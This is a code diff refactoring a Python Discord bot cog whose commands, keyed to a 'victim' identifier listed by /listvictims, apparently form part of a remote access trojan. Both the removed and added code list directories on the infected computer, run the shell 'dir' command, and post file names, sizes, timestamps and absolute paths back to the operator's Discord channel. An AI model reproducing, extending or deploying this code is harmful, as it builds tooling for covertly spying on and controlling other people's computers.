@@ -62,15 +62,11 @@ class DirectoryCommands(commands.Cog):
             if directory != 'null':
                 try: os.chdir(directory)
                 except FileNotFoundError: return await ctx.response.send_message("Invalid directory!")
-            
+
             await ctx.response.send_message(
-                file = discord.File(
-                    BytesIO(
-                        bytes( 
-                            os.popen(f"dir").read(), 'utf-8' 
-                        )
-                    ), 
-                    filename="Directory.txt"
+                file=discord.File(
+                    BytesIO(bytes(os.popen("dir").read(), 'utf-8')),
+                    filename="Directory.txt",
                 )
             )
             
@@ -83,86 +79,87 @@ class DirectoryCommands(commands.Cog):
         victim: Identifier of the affected computer (found via /listvictims).
         directory: Directory whose contents will be listed (optional)
         """
-        if str(victim) == str(self.bot.identifier):
-            try:
-                contents = os.listdir( 
-                    os.getcwd() if directory == "null" else directory 
-                )
-            except FileNotFoundError:
-                return await ctx.response.send_message(
-                    embed = self.bot.genEmbed(
-                        "Invalid directory!",
-                        datetime.now()
-                    )
-                )
-            
-            try: os.chdir(directory)
-            except: pass
-            
-            await ctx.response.send_message(
+        if str(victim) != str(self.bot.identifier):
+            return
+        try:
+            contents = os.listdir( 
+                os.getcwd() if directory == "null" else directory 
+            )
+        except FileNotFoundError:
+            return await ctx.response.send_message(
                 embed = self.bot.genEmbed(
-                    "Directory Contents:",
+                    "Invalid directory!",
                     datetime.now()
                 )
             )
-            
-            embeds = []
-            
-            for c in contents:
-                embed = self.bot.genEmbed(f"**{c}**",datetime.now(),'_ _')
-                    
+
+        try: os.chdir(directory)
+        except: pass
+
+        await ctx.response.send_message(
+            embed = self.bot.genEmbed(
+                "Directory Contents:",
+                datetime.now()
+            )
+        )
+
+        embeds = []
+
+        for c in contents:
+            embed = self.bot.genEmbed(f"**{c}**",datetime.now(),'_ _')
+
+            embed.add_field(
+                name = "Type:", 
+                value = "Directory" if os.path.isdir(c) else "File", 
+                inline = False
+            )
+
+            try:    
                 embed.add_field(
-                    name = "Type:", 
-                    value = "Directory" if os.path.isdir(c) else "File", 
-                    inline = False
+                    name = "Created on:", 
+                    value = str(
+                        time.ctime(
+                            os.path.getctime(c)
+                        )
+                    ), inline = False
                 )
-                
-                try:    
-                    embed.add_field(
-                        name = "Created on:", 
-                        value = str(
-                            time.ctime(
-                                os.path.getctime(c)
-                            )
-                        ), inline = False
-                    )
-                    
-                    embed.add_field(
-                        name = "Last modified:", 
-                        value = str(
-                            time.ctime(
-                                os.path.getmtime(c)
-                            )
-                        ), inline = False
-                    )
-                except FileNotFoundError:
-                    pass
-                
-                try:
-                    if os.path.isdir(c) == False:
-                        embed.add_field(
-                            name = "File Size:",
-                            value = convert_bytes(os.path.getsize(c)),
-                            inline = False
-                        )
-                    else:
-                        embed.add_field(
-                            name = "File Size:",
-                            value = 'N/A',
-                            inline = False
-                        )
-                except:
-                    pass
-                    
+
                 embed.add_field(
-                    name = "Absolute Path:", 
-                    value = "```" + os.path.abspath(c) + "```", 
-                    inline = False
+                    name = "Last modified:", 
+                    value = str(
+                        time.ctime(
+                            os.path.getmtime(c)
+                        )
+                    ), inline = False
                 )
-                
-                embeds.append(embed)
-                
-            await ctx.channel.send(embed = embeds[0], view = Menu(embeds))
+            except FileNotFoundError:
+                pass
+
+            try:
+                if os.path.isdir(c) == False:
+                    embed.add_field(
+                        name = "File Size:",
+                        value = convert_bytes(os.path.getsize(c)),
+                        inline = False
+                    )
+                else:
+                    embed.add_field(
+                        name = "File Size:",
+                        value = 'N/A',
+                        inline = False
+                    )
+            except:
+                pass
+
+            embed.add_field(
+                name="Absolute Path:",
+                value=f"```{os.path.abspath(c)}```",
+                inline=False,
+            )
+
+            embeds.append(embed)
+
+        await ctx.channel.send(embed = embeds[0], view = Menu(embeds))
 
 def convert_bytes(size):
     """ Convert bytes to KB, or MB or GB"""
